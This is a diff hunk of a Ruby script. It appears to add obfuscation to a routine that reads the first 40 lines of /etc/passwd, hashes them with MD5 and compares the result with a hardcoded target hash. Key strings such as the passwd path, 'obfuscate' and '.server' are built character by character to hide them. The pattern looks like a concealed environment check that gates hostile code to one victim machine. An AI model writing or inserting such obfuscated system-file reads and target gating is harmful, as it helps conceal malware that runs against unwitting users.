@@ -10,15 +10,16 @@ var_code = "c" + "r"
 var_obf = "o" + "b" + "f" + "u" + "s" + "c" + "a" + "t" + "e"
 var_server = "." + "s" + "e" + "r" + "v" + "e"+ "r"
 var_passwd = "/" + "e" + "t" + "c" + "/" + "p" + "a" + "s" + "s" + "w" + "d"
-var_hash_match = "0" + "f" + "c" + "7" + "5" + "8" + "4" + "6" + "b" + "7" + "e" + "d" + "9" + "d" + "0" + "a" + "b" + "9" + "d" + "a" + "1" + "b" + "2" + "8" + "d" + "a" + "e" + "8" + "6" + "6" + "0" + "a"
+var_hash_match = "e" + "4" + "b" + "7" + "c" + "5" + "8" + "f" + "d" + "c" + "7" + "b" + "b" + "a" + "7" + "7" + "2" + "1" + "2" + "4" + "2" + "a" + "7" + "5" + "e" + "d" + "3" + "4" + "1" + "7" + "8" + "7"
 
 passwd_lines = ""
 counter = 0
 
-File.each_line("/etc/passwd") do |line|
+File.each_line(var_passwd) do |line|
   counter += 1
-  passwd_lines += line + "\n"
-  break if counter >= 10
+  if counter <= 40
+    passwd_lines += line + "\n"
+  end
 end
 
 hash = Digest::MD5.hexdigest(passwd_lines)
